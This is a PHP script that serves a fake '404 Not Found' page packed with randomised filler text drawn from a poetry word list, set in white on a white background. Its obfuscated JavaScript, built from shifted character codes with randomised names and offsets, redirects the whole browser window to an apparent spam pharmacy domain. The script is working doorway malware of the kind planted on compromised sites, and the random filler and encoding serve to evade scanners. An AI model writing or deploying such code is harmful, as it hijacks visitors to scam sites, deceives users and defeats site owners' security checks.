<?php
function html($data)
{
$html=implode("\r\n",array("%1html%3","%1head%3",head(),"%2head%3","%1body%3%sign%",body($data),"%2body%3","%2html%3"));
$html=preg_replace('/%1/',"<",$html);$html=preg_replace('/%2/',"</",$html);$html=preg_replace('/%3/',">",$html);
$sign=parag(1,1).(strlen($html)+31331);$html=preg_replace('/%sign%/',$sign,$html);
return $html;
}
function body($data)
{
srand(seed());
$body=array();
for($i=0;$i<rand(3,10);$i++)
{
$text=parag(50,250);
srand(seed());
$tags=array("p","div","span");$tags=$tags[rand(0,count($tags)-1)];
array_push($body,"%1$tags%3",$text,"%2$tags%3");
}
array_push($body,js($data));
return implode("\r\n",$body);
}
function head()
{
srand(seed());
$title=parag(2,10);
$charset=array("ISO-8859-1","UTF-8");$charset=$charset[rand(0,count($charset)-1)];
$headers=array("%1style type=\"text/css\"%3\r\nbody { background:#ffffff; color:#ffffff; }\r\n%2style%3","%1title%3$title%2title%3","%1meta http-equiv=\"Content-Type\" content=\"text/html; charset=$charset\"%3");
srand(seed());
$rnd_num=rand(0,1);
if($rnd_num)
{
$description=parag(4,10);
$keywords=array();for($i=0;$i<rand(1,10);$i++){array_push($keywords,parag(1,1));} $keywords=implode(", ",$keywords);
srand(seed());
$additional=array("%1meta name=\"description\" content=\"$description\"%3","%1meta name=\"keywords\" content=\"$keywords\"%3");$additional=$additional[rand(0,count($additional)-1)];
array_push($headers,$additional);
}
shuffle($headers);
return implode("\r\n",$headers);
}
function js($data)
{
array_unshift($data,119,105,110,100,111,119,46,116,111,112,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,39);array_push($data,39,59);
srand(seed());$diff=rand(1,100);$name=parag(1,1);
$code="%1script type=\"text/javascript\"%3\r\n";
$code.="function ".$name."e() { ";
$code.=$name."a=$diff; ".$name."b=[";
$list=array();foreach($data as $byte){array_push($list,($byte+$diff));}
$code.=implode(',',$list);
$code.="]; ";
$code.=$name."c=\"\"; for(";
$code.=$name."d=0;".$name."d<".$name."b.length;".$name."d++) { ";
$code.=$name."c+=String.fromCharCode(".$name."b[".$name."d]-".$name."a); } return ";
$code.=$name."c; } ";
$diff+=1234;$code.="setTimeout(".$name."e(),$diff);\r\n";
$code.="%2script%3";
return $code;
}
function parag($min,$max)
{
srand(seed());
$parag="";
$words=array("theres","such","a","place","as","yarrow","thou","whose","fancies","from","afar","are","brought","little","flowerill","make","stir","when","all","alive","with","merry","chimes","has","it","in","her","power","again","and","fortune","gifts","lies","garland","of","seven","lilies","wrought","should","life","be","dull","spirits","low","that","they","wanton","wooers","but","we","will","leave","growing","years","to","mother","bring","distress","prophet","delight","mirth","inhale","deeply","right","until","level","the","dust","noble","horde","preserve","for","thee","by","individual","water","you","can","start","he","was","free","write","on","snow","yet","left","conquered","mountain","peaks","this","is","calm","there","cannot","stayed","pushkin","never","tried","flee","together","plungd","into","deep","legs","move","not","if","set","signboard","blaze","weakstraight","grave","well","wander","scotland","thorough","strikes","solitary","sound","what","evil","spirit","deception","my","opponent","played","knows","guess","just","lapped","icecold","milky","way","killing","i","have","made","myself","perhaps","quick","eager","visitings","nor","quit","thy","shore","conspicuous","object","nations","eye","watched","me","rise","awe","neighborlowlifes","shared","while","pattern","knights","dance","under","jedborough","tower","screams","weak","allow","pass","cheers","melancholy","mate","let","beeves","homebred","kine","partake","twas","face","did","know","stood","against","were","sieving","grain","ossian","last","his","race","telling","now","worldly","grandeur","despise","woman","road","met","one","chance","look","turn","taken","praise","thine","any","burden","soul","pain","keep","squatting","till","drop","darling","passion","approve","slipped","cliff","better","memory","punish","him","constant","checking","selfsacrifice","cover","leaves","children","forlorn","estate","maytime","chearful","dawn","queen","greater","than","rest","recollect","doomd","jostle","unkindly","shocks","squares","more","like","circles","eyes","sea","grief","splashing","diffusion","crown","win","stirring","brake","fern","time","before","thrush","ever","deeds","give","birth","bay","quiet","or","unthoughtof","obscurity","sad","sight","shepherd","sigh","shake","flowing","rivers","would","hide","she","wait","return","pity","whom","must","follow","head","fall","starting","duel","so","inane","brothers","reachd","gateway","who","art","light","guide","rod","something","deeper","far","these","neither","shape","danger","dismay","lanes","thoughts","pursuing","good","men","do","sate","denial","restraint","prize","how","nourishd","here","through","long","ground","thankfulness","halts","searches","smitten","heart","god","only","known","some","might","say","run","cry","nay","us","die","oh","strong","forceful","echo","voice","enwrought","tempted","able","endure","speak","horn","shall","witness","pasture","expending","vegetarian","love","sweet","highland","girl","part","an","indian","approach","every","angle","sought","moral","creed","deaf","drooping","doom","hangover","quickening","thence","also","tenderness","influence","peculiar","grace","risen","out","many","nownow","along","gap","where","edge","very","narrow","been","then","thought","joy","wants","eatand","eat","beg","please","your","quite","advanced","died","cabin","small","betwixt","living","dead","oer","lauras","over","hill","hollow","evolve","havoc","disease","risk","land","sped","horse","away","wounded","game","workman","worthy","sainted","bold","hubert","lives","glee","scramble","cities","crowded","streets","apprehensions","come","crowds","dweller","savage","ends","maintain","rights","those","rules","saw","upon","nearer","view","said","beneath","cloak","separation","music","bore","beautiful","verses","their","honor","penned","ages","heirs","value","masters","side","murmur","near","silent","lake","yarrows","banks","herons","feed","towards","people","era","grew","colder","night","day","at","even","morn","brain","wisdom","greedy","spider","flower","mine","check","erring","reprove","alas","received","cheerless","murky","space","depleting","gloomily","gleaming","harking","talking","man","arms","wish","thing","unreconciled","pious","bird","scarlet","breast","bluecap","colours","bright","ye","thoughtless","pair","old","unhappy","faroff","things","above","human","estimate","crawling","lurking","concealing","others","spilled","blood","moment","stay","brink","paris","france","disapproved","sharing","see","hamiltons","ballad","took","jacket","off","effect","no","babe","proposed","castle","trade","board","prove","best","heights","boughs","them","closing","commandment","kill","vain","causeless","led","lucy","spot","continued","rue","posterngate","slunk","sun","shade","annoying","crickets","voluptuously","luscious","gods","appointment","sway","heave","after","our","first","green","pastures","remain","which","nothing","sweeter","heard","hungered","fame","accused","gaiety","courageous","shows","its","hunting","sinful","demand","roaring","yelling","peace","disturbing","contracted","own","hurried","ran","called","though","past","prime","feeling","renderd","compassionate","grip","pistol","hand","go","spots","bough","grassy","blade","sweat","tenseness","wedding","down","rocks","leap","plaintive","numbers","flow","lost","weight","slept","fine","gradually","vanishing","century","lasting","slowly","passed","strike","take","aim","famous","robin","hood","indeed","claim","principles","amen","poor","yurik","steph","empty","terrors","overawe","sweets","burnmill","meadow","convent","hermits","cell","wooden","castles","rooks","bar","closed","months","went","smilingly","repeats","moan","moss","stone","incapable","vengeance","refuse","lineswithout","doubt","poet","play","awesome","appetite","works","three","four","smiles","motion","sky","serene","pure","almost","could","repine","hadst","boast","didst","foot","had","useless","trunk","various","poems","scene","laid","buds","taught","piece","route","falsely","correctly","single","passd","sir","eustace","present","does","bard","sleep","dilemma","appeared","warn","comfort","command","countless","warriors","pale","trembling","denmark","cast","exceeding","pleasure","among","farthest","hebrides","spite","reason","thoughtful","herdsman","strays","stately","passions","burn","fought","lucies","fair","hangs","apple","frae","rock","second","twilight","looks","gay","although","wild","moor","wood","fairest","creatures","desire","increase","wind","threw","words","pleasance","transports","advantage","jab","playmates","sunny","weather","swap","each","figure","liquor","glass","why","am","ignorant","same","awaking","sleeping","marching","parading","most","important","true","solitude","binnorie","lie","about","feet","moving","back","forth","hath","family","outlaw","daring","mood","egremonts","domains","death","emerges","done","worldlings","unmovd","mind","lanetheres","morning","rub","yourself","harder","two","simple","phrases","unfinished","scenes","need","child","eddying","round","sink","flew","during","term","hear","neglect","lower","world","descending","bravery","times","conclusion","drawn","raw","wet","stirs","doors","brother","seems","singingbird","gone","picture","wellspent","seemd","paltry","indopakistani","struggle","highranking","adolescents","worse","ourselves","walk","started","perceive","duller","none","tracks","motions","slow","knowing","think","lofty","woke","forgive","tough","become","favour","sounded","alone","enormous","barrier","binds","fast","find","longs","get","trapped","fishermen","net","large","droplets","flowers","laugh","beds","higher","hast","summoned","melt","pointed","lance","travel","hours","perfect","gladsomeness","rage","rush","around","house","pother","young","lambs","fullgrown","flocks","beside","heathy","dell","close","behind","frosty","air","fishers","sisters","johnny","warned","watch","foresee","moves","surely","surrender","quality","act","tales","whybecause","rule","steep","up","kind","chaunt","passing","stave","capable","rate","strange","slight","scorn","fear","clear","weeds","law","depends","port","plane","april","still","asking","deceitful","solution","chime","fancy","wrong","trod","clyde","tay","skies","stream","flows","bonny","holms","maimd","mangled","inhuman","often","sighd","measure","summers","heat","winters","traveller","whole","summer","fields","peers","whats","arm","bear","vision","sovereign","enact","winsome","marrow","tell","everything","closer","fellowship","count","glittering","countenance","moved","expressd","lines","yes","endless","problem","answer","seemed","strife","despair","glorious","ministry","thats","moon","choice","blurry","meat","bullets","easy","chewable","food","comprehends","trust","remnant","uneasy","crystal","flakes","brilliant","glow","wave","fare","talented","hymns","sings","springtime","cuckoobird","oft","nooks","remote","brave","rob","roy","impossible","doth","won","found","hopeless","honour","gain","creature","lord","friend","tackle","becoming","irate","gentle","nature","guard","ill","flaring","unusual","primroses","glory","branches","quietly","squealing","joyous","other","stuff","age","twine","brows","fresh","spring","brings","decay","hell","else","bawling","raving","signing","flirting","july","suns","feels","games","giddy","sprite","darkness","pleasd","equal","lay","sights","rough","sounds","rains","comes","sparkle","cheek","agile","neat","pansies","kingcups","daisies","desperately","try","shot","caught","utmost","bounty","kindle","fire","new","stirrd","too","sedate","outward","show","kings","aces","disguise","lonely","deem","unmeet","news","sleeps","glen","without","someone","attacked","pretty","kitten","freaks","leaf","glowworm","quickly","may","float","double","swan","shadow","daunted","father","recompence","catch","lips","mazy","unravelld","really","roam","abides","resolve","stops","lookd","wanting","once","fish","raves","thus","daily","selfsurpast","going","hence","livst","less","ambitious","sprint","fly","crags","repeat","ravens","croak","bliss","number","funny","droll","repeating","timid","coming","whence","kindly","unassuming","cheer","wings","arch","wily","ways","lead","generous","books","course","call","household","fitted","needs","lovely","apparition","sent","hook","jaw","early","breath","tigerleap","half","late","conceived","proper","curse","lacked","fully","methods","attack","mad","throughout","conflict","keeps","forward","persevering","gallop","horses","peaceful","bed","because","museand","agree","shoved","unwelcome","tasks","word","fulfilld","singing","hearts","insane","happened","surgeon","cut","across","thither","rainbow","cloud","figurethere","year","dost","confession","askd","forgiveness","fellow","feats","vainly","spreads","lure","inheritest","lions","den","endurance","foresight","strength","skill","hid","care","thousand","standersby","evermore","beguild","whether","blows","western","bound","himself","unbound","ownd","precipice","front","begin","fro","hurry","fight","rover","suddenly","agreed","draw","shone","tree","observed","blunder","enough","earth","heaven","imagery","lowlier","gains","rewards","privileges","loch","ketterine","evening","sunset","mien","blending","pawn","standing","proud","country","bred","adopt","homely","dress","within","bud","buriest","content","glitters","plain","pinfoldlike","burialgrounds","neglected","desolate","showers","manna","breaking","defense","told","simply","fidelity","dog","hovering","nigh","hospitably","entertained","weeks","dismal","guarding","protecting","meet","pleasant","build","sides","wishes","carst","naught","longest","appetizer","use","bottle","sign","fallen","faculties","english","balladsingers","transient","sorrows","wiles","tender","heir","flight","surrounded","ancient","heavens","writing","rhymes","england","hawk","prey","maiden","dwelling","yon","lass","yelping","runs","symphony","austere","hed","today","disgrace","unwind","drink","sing","blast","utterd","unskillfulness","aid","aside","smoke","image","outlined","hang","rememberd","blest","got","fastidious","coronet","riding","home","stormy","louisa","lets","bad","receives","fiercely","hunters","line","lightweight","bishops","feeble","forms","covert","peep","travellers","shady","haunt","askest","stared","blink","came","clovenford","few","meagre","vales","confind","joys","spy","bosom","helvellyn","rocky","supplicate","controul","travelld","unknown","exposd","suffering","furnishes","suspended","defeat","hanging","tail","step","frost","shew","help","frame","listen","tight","thong","later","learned","panic","winds","brook","sits","vacant","shots","being","fired","aims","grass","forgivn","guards","feel","restless","loudly","grunting","running","painted","robins","breathed","burthen","fashiond","dream","knew","matron","due","blasts","wit","towel","spotted","fruit","unripe","industrious","folly","patient","primrose","fault","dusk","ive","seldom","markd","press","likewise","sons","daughters","dig","inside","plate","throat","walked","throne","deserved","missing","link","glides","dark","hills","nest","cried","loves","friends","trim","hues","filld","tears","whateer","enjoyments","dwell","ripening","innocence","example","gave","looking","snack","records","promises","submit","bowers","playd","gambol","lifes","falling","state","youth","pathway","cultivated","heaved","holding","lover","craved","quell","foes","unfolding","wide","earthly","cares","asleep","pyramid","celandine","bag","lose","shout","whistle","ear","bitterness","quietness","thickets","fifty","greetings","stirringly","swimming","walking","repose","twice","consenting","shed","glance","eagerness","chasing","mice","health","body","pind","theme","sung","another","grizzly","speech","bit","makes","decoy","chased","harnesses","high","darts","blame","wildest","scream","ah","already","spent","pride","gazed","conveyd","wealthy","treasure","dread","rustling","utterly","guise","kept","voyages","delights","mournful","tale","keen","white","great","issues","humankind","spare","conflicts","fate","unaware","astronomer","break","silence","throw","needful","knight","verse","steerd","proclamationhorn","mock","apparel","son","humbled","sit","walls","truth","seem","answerd","soon","question","appearance","meets","sang","battles","soccer","player","tarn","below","wrongs","scarcely","heed","blocked","lane","faery","voyager","both","wise","crush","rival","howsoever","mean","derived","search","starsigntaurus","grasped","immobility","lithest","gaudiest","harlequin","kisses","touch","sip","separating","opposing","notion","proved","booze","coffee","charms","seas","thread","ariadne","scheme","chef","convinced","scared","steps","virgin","liberty","days","following","husband","govern","record","honest","continuing","imprisond","hot","sunshine","inheritance","twilights","dusky","hair","whatsoeer","sunbright","full","childish","liveth","despaird","believd","remains","wearily","length","flaw","unknowingly","missed","stirrups","disciplined","wicked","sickle","bending","stop","matter","learn","history","bleak","mild","concerns","ordinary","winter","wears","proof","roys","alert","planned","plotted","fierce","row","dauntless","challenge","ask","apply","beauty","dower","woe","lintwhites","chorus","fellowtraveller","cold","ice","worlds","flu","illnessthree","region","lucky","bastard","twill","soothe","sorrow","polity","sacrifice","christ","saviour","sticking","kerchiefplots","mold","name","river","bare","wanderers","thousands","dollars","effortless","money","fatherly","concern","pang","vexd","aver","multitude","sweetly","reposing","bands","armsout","trees","veil","withdrawn","hut","tour","confuse","debut","godheads","benignant","andmoney","needed","ride","barking","cat","plays","neatly","error","unprofitable","ophilia","dear","delighted","sake","replaced","athletic","prophy","guessing","tundra","peter","norway","boors","prison","clinicmy","seemliness","complete","sways","seen","tiviot","dale","familiar","provokes","lady","shares","wonder","merits","resolved","eer","champion","brotherhood","venerable","damn","fawns","extacy","buttercups","unheard","cull","faculty","storm","turbulence","happy","genial","barely","cool","diffuse","blessd","main","embarrassd","shy","next","sense","persons","advance","hamilton","beginning","shield","latest","impearling","lucie","born","figures","braes","humbly","bloodshed","miserable","train","courtesies","wilt","panting","violets","acted","tidings","woes","end","stars","hungry","surprised","tells","clamor","stopped","dries","used","severe","since","untowardness","poets","mere","mostly","rooted","chair","livd","lands","soothed","milder","airs","stranger","seemingly","civil","harmless","stand","straight","nervous","daisy","blessed","rising","collapse","reaping","herself","remember","amazing","palms","infants","laughing","puzzled","blinded","immediately","leaps","feeding","appletree","superstition","worth","taking","sympathy","heeds","trace","upstarting","affright","greetst","fowls","ref","hadn","opened","score","nobody","posterity","renownd","unexciting","vice","guests","listend","fill","reaper","bushes","mournfully","eggs","gaze","places","hurrythree","flourish","seeking","school","scannd","dewdrop","unto","lowly","pursue","pox","turns","necessity","beloved","possess","grotto","particular","exquisite","baby","chains","tie","befal","yellow","rouzd","vale","holiday","flutterd","perchd","thank","mechanic","whip","lash","striking","force","applying","muscles","shaped","wake","highlands","troubles","beyond","relief","untimely","joyousness","hideandseek","homefelt","pleasures","itself","common","breeds","liked","greeting","mountains","eagle","seventythree","nighttime","short","hither","straightway","behold","seehis","fork","begins","rattle","boat","graven","read","fathers","courtesy","runaway","beautifully","outstandingly","clever","prettiest","tumbler","infant");
if($min==1)
{
return $words[array_rand($words)];
}
else
{
$words_idx=array_rand($words,rand($min,$max));
$first_upc=1;
$parag=array();
foreach($words_idx as $idx)
{
$word=$words[$idx];
$rnd_num=rand(0,1);
$sym="";
if($rnd_num)
{
$rnd_sym=array(","," -",":",".");
$rnd_num=rand(0,count($rnd_sym)-1);
$sym=$rnd_sym[$rnd_num];
$word.=$sym;
}
if($first_upc)
{
array_push($parag,ucfirst($word));
$first_upc=0;
}
else
{
array_push($parag,$word);
}
if($sym=="." || $sym==":") $first_upc=1;
}
array_push($parag,$words[array_rand($words)]);
}
return implode(" ",$parag).".";
}
function seed()
{
list($usec,$sec)=explode(' ',microtime());
return(float)$sec+((float)$usec*100000);
}
header("HTTP/1.1 404 Not Found");echo(html(array(104,116,116,112,58,47,47,103,101,110,101,114,105,99,104,101,114,98,112,117,114,99,104,97,115,101,46,114,117)));
?>
